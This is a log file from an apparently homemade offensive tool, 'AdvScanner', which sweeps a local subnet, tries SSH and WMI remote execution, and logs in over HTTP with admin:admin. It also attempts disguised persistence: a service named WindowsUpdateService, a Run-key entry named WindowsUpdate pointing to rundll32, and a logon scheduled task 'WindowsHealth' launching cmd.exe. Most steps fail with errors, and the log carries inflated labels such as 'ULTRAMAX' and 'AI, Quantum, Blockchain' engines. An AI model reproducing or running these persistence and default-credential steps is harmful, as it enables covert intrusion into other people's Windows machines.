2026-05-06 15:24:30,653 | [ERROR] | AdvScanner | [SSH-EXEC] None: [Errno None] Unable to connect to port 22 on 127.0.0.1 or ::1
2026-05-06 15:24:32,751 | [ERROR] | AdvScanner | [SSH-EXEC] None: [Errno None] Unable to connect to port 22 on 127.0.0.1 or ::1
2026-05-06 15:24:34,850 | [ERROR] | AdvScanner | [SSH-EXEC] None: [Errno None] Unable to connect to port 22 on 127.0.0.1 or ::1
2026-05-06 15:24:37,251 | [ERROR] | AdvScanner | [SSH-EXEC] None: [Errno None] Unable to connect to port 22 on 127.0.0.1 or ::1
2026-05-06 15:24:39,565 | [ERROR] | AdvScanner | [SSH-EXEC] None: [Errno None] Unable to connect to port 22 on 127.0.0.1 or ::1
2026-05-06 15:24:41,966 | [ERROR] | AdvScanner | [SSH-EXEC] None: [Errno None] Unable to connect to port 22 on 127.0.0.1 or ::1
2026-05-06 15:24:44,368 | [ERROR] | AdvScanner | [SSH-EXEC] None: [Errno None] Unable to connect to port 22 on 127.0.0.1 or ::1
2026-05-06 15:24:46,634 | [ERROR] | AdvScanner | [SSH-EXEC] None: [Errno None] Unable to connect to port 22 on 127.0.0.1 or ::1
2026-05-06 15:24:48,831 | [ERROR] | AdvScanner | [SSH-EXEC] None: [Errno None] Unable to connect to port 22 on 127.0.0.1 or ::1
2026-05-06 16:09:23,243 | [INFO] | AdvScanner | [INSTALLED-SOFTWARE] Listing on None
2026-05-06 16:09:23,244 | [INFO] | AdvScanner | [WMI-EXEC] None: powershell -NoProfile -ExecutionPolicy Bypass -Command "
        Get-ItemPropert
2026-05-06 16:09:23,245 | [ERROR] | AdvScanner | [WMI-EXEC] None: object of type 'NoneType' has no len()
2026-05-06 16:09:50,397 | [INFO] | AdvScanner | [SVC-INSTALL] None: WindowsUpdateService -> C:\Windows\System32\svchost.exe -k netsvcs
2026-05-06 16:09:52,702 | [ERROR] | AdvScanner | [SVC-INSTALL] None: [Errno Connection error (None:445)] [Errno 11001] getaddrinfo failed
2026-05-06 16:09:52,705 | [INFO] | AdvScanner | [REG-WRITE] None: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate = C:\Windows\System32\rundll32.exe
2026-05-06 16:09:52,707 | [INFO] | AdvScanner | [WMI-EXEC] None: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" 
2026-05-06 16:09:52,709 | [ERROR] | AdvScanner | [WMI-EXEC] None: object of type 'NoneType' has no len()
2026-05-06 16:09:52,710 | [INFO] | AdvScanner | [REG-WRITE] None: FAILED
2026-05-06 16:09:52,712 | [INFO] | AdvScanner | [WMI-EXEC] None: schtasks /create /tn "WindowsHealth" /tr "C:\Windows\System32\cmd.exe" /sc onlog
2026-05-06 16:09:52,714 | [ERROR] | AdvScanner | [WMI-EXEC] None: object of type 'NoneType' has no len()
2026-05-06 16:10:35,972 | [INFO] | AdvScanner | [ULTRAMAX] GLOBAL NETWORK DISCOVERY INITIATED
2026-05-06 16:10:36,044 | [INFO] | AdvScanner | [ULTRAMAX] Scanning range 1/10: 192.168.137.0/24
2026-05-06 16:11:26,647 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.165
2026-05-06 16:11:27,914 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.165
2026-05-06 16:11:28,576 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
2026-05-06 16:11:29,125 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
2026-05-06 16:15:58,405 | [INFO] | AdvScanner | [TCP-ULTRA] Found: 192.168.137.201 | OS: Windows | Ports: 2
2026-05-07 09:02:14,399 | [INFO] | AdvScanner | [ULTRAMAX] GLOBAL NETWORK DISCOVERY INITIATED
2026-05-07 09:02:14,414 | [INFO] | AdvScanner | [ULTRAMAX] Scanning range 1/10: 192.168.137.0/24
2026-05-07 09:03:36,474 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.41
2026-05-07 09:03:36,978 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.41
2026-05-07 09:03:37,431 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.135
2026-05-07 09:03:38,022 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.135
2026-05-07 09:03:40,250 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.37
2026-05-07 09:03:41,031 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.37
2026-05-07 09:03:42,072 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.38
2026-05-07 09:03:42,616 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.38
2026-05-07 09:03:43,940 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.40
2026-05-07 09:03:44,402 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.40
2026-05-07 09:09:32,974 | [INFO] | AdvScanner | [TCP-ULTRA] Found: 192.168.137.201 | OS: Windows | Ports: 2
2026-05-07 09:13:58,807 | [INFO] | AdvScanner | [ULTRAMAX] GLOBAL NETWORK DISCOVERY INITIATED
2026-05-07 09:13:58,821 | [INFO] | AdvScanner | [ULTRAMAX] Scanning range 1/10: 192.168.137.0/24
2026-05-07 09:24:59,804 | [INFO] | AdvScanner | [ULTRAMAX] GLOBAL NETWORK DISCOVERY INITIATED
2026-05-07 09:24:59,832 | [INFO] | AdvScanner | [ULTRAMAX] Scanning range 1/10: 192.168.137.0/24
2026-05-07 09:29:05,925 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
2026-05-07 09:29:08,818 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
2026-05-07 09:35:08,801 | [INFO] | AdvScanner | [TCP-ULTRA] Found: 192.168.137.201 | OS: Windows | Ports: 2
2026-05-07 09:59:24,188 | [INFO] | AdvScanner | [ULTRAMAX] GLOBAL NETWORK DISCOVERY INITIATED
2026-05-07 09:59:24,203 | [INFO] | AdvScanner | [ULTRAMAX] Scanning range 1/10: 192.168.137.0/24
2026-05-07 10:51:15,984 | [INFO] | AdvScanner | [ULTRAMAX] GLOBAL NETWORK DISCOVERY INITIATED
2026-05-07 10:51:16,048 | [INFO] | AdvScanner | [ULTRAMAX] Scanning range 1/10: 192.168.137.0/24
2026-05-07 10:53:00,797 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.66
2026-05-07 10:53:01,149 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.66
2026-05-07 10:53:02,700 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
2026-05-07 10:53:03,284 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
2026-05-07 10:56:37,987 | [INFO] | AdvScanner | [TCP-ULTRA] Found: 192.168.137.201 | OS: Windows | Ports: 1
2026-05-08 09:19:15,462 | [INFO] | AdvScanner | [DISCOVER] Starting comprehensive discovery on 192.168.137.0/24
2026-05-08 09:19:18,077 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
2026-05-08 09:19:18,079 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
2026-05-08 09:25:14,087 | [INFO] | AdvScanner | [DISCOVER] Starting comprehensive discovery on 192.168.137.0/24
2026-05-08 09:25:16,086 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
2026-05-08 09:25:16,088 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
2026-05-08 09:30:21,974 | [INFO] | AdvScanner | [TCP-ULTRA] Found: 192.168.137.201 | OS: Windows | Ports: 2
2026-05-08 09:40:15,507 | [INFO] | AdvScanner | [HTTP] Basic auth: 192.168.137.201:8080/ as admin:admin
2026-05-08 09:40:15,671 | [INFO] | AdvScanner | [HTTP] Basic auth: 192.168.137.201:8080/ as admin:admin
2026-05-08 09:55:19,486 | [INFO] | AdvScanner | [EXPLOIT] Starting AGGRESSIVE exploitation on 192.168.137.201
2026-05-08 09:55:19,488 | [INFO] | AdvScanner | [EXPLOIT] Performing vulnerability checks for 192.168.137.201
2026-05-08 13:20:01,991 | [INFO] | AdvScanner | [REVOLUTIONARY] AI, Quantum, Blockchain, IoT, and Hypervisor engines initialized
2026-05-08 13:27:36,784 | [INFO] | AdvScanner | [REVOLUTIONARY] AI, Quantum, Blockchain, IoT, and Hypervisor engines initialized
2026-05-08 13:34:09,881 | [INFO] | AdvScanner | [REVOLUTIONARY] AI, Quantum, Blockchain, IoT, and Hypervisor engines initialized
2026-05-08 13:34:59,578 | [INFO] | AdvScanner | [REVOLUTIONARY] AI, Quantum, Blockchain, IoT, and Hypervisor engines initialized
2026-05-08 13:54:09,363 | [INFO] | AdvScanner | [REVOLUTIONARY] AI, Quantum, Blockchain, IoT, and Hypervisor engines initialized
2026-05-08 13:56:42,374 | [INFO] | AdvScanner | [REVOLUTIONARY] AI, Quantum, Blockchain, IoT, and Hypervisor engines initialized
2026-05-08 13:57:06,466 | [INFO] | AdvScanner | [DISCOVER] Starting comprehensive discovery on 192.168.137.0/24
2026-05-08 13:57:08,085 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
2026-05-08 13:57:08,088 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
2026-05-08 14:01:59,388 | [INFO] | AdvScanner | [TCP-ULTRA] Found: 192.168.137.201 | OS: Windows | Ports: 2
2026-05-08 14:05:41,784 | [INFO] | AdvScanner | [DISCOVER] Found 1 devices
2026-05-08 14:05:41,787 | [INFO] | AdvScanner | [DISCOVER] Device: 192.168.137.201 | OS: Windows | Type: unknown | Hostname: DESKTOP-186DCD0.mshome.net | Ports: []
2026-05-08 14:43:34,347 | [INFO] | AdvScanner | [REVOLUTIONARY] AI, Quantum, Blockchain, IoT, and Hypervisor engines initialized
2026-05-08 14:56:57,125 | [INFO] | AdvScanner | [REVOLUTIONARY] AI, Quantum, Blockchain, IoT, and Hypervisor engines initialized
2026-05-08 15:04:15,569 | [INFO] | AdvScanner | [REVOLUTIONARY] AI, Quantum, Blockchain, IoT, and Hypervisor engines initialized
2026-05-08 15:08:58,278 | [INFO] | AdvScanner | [SVC-INSTALL] None: WindowsUpdateService -> C:\Windows\System32\svchost.exe -k netsvcs
2026-05-08 15:09:00,680 | [ERROR] | AdvScanner | [SVC-INSTALL] None: [Errno Connection error (None:445)] [Errno 11001] getaddrinfo failed
2026-05-08 15:09:00,682 | [INFO] | AdvScanner | [REG-WRITE] None: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate = C:\Windows\System32\rundll32.exe
2026-05-08 15:09:00,683 | [INFO] | AdvScanner | [WMI-EXEC] None: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" 
2026-05-08 15:09:00,684 | [ERROR] | AdvScanner | [WMI-EXEC] None: object of type 'NoneType' has no len()
2026-05-08 15:09:00,685 | [INFO] | AdvScanner | [REG-WRITE] None: FAILED
2026-05-08 15:09:00,686 | [INFO] | AdvScanner | [WMI-EXEC] None: schtasks /create /tn "WindowsHealth" /tr "C:\Windows\System32\cmd.exe" /sc onlog
2026-05-08 15:09:00,687 | [ERROR] | AdvScanner | [WMI-EXEC] None: object of type 'NoneType' has no len()
2026-05-08 15:15:40,382 | [INFO] | AdvScanner | [DISCOVER] Starting comprehensive discovery on 192.168.137.0/24
2026-05-08 15:15:43,248 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
2026-05-08 15:15:43,250 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
2026-05-08 15:16:47,321 | [INFO] | AdvScanner | [REVOLUTIONARY] AI, Quantum, Blockchain, IoT, and Hypervisor engines initialized
2026-05-08 15:22:03,526 | [INFO] | AdvScanner | [TCP-ULTRA] Found: 192.168.137.201 | OS: Windows | Ports: 2
2026-05-08 15:24:02,719 | [INFO] | AdvScanner | [DISCOVER] Found 1 devices
2026-05-08 15:24:02,721 | [INFO] | AdvScanner | [DISCOVER] Device: 192.168.137.201 | OS: Unknown Device Type | Type: unknown | Hostname: 192.168.137.201 | Ports: []
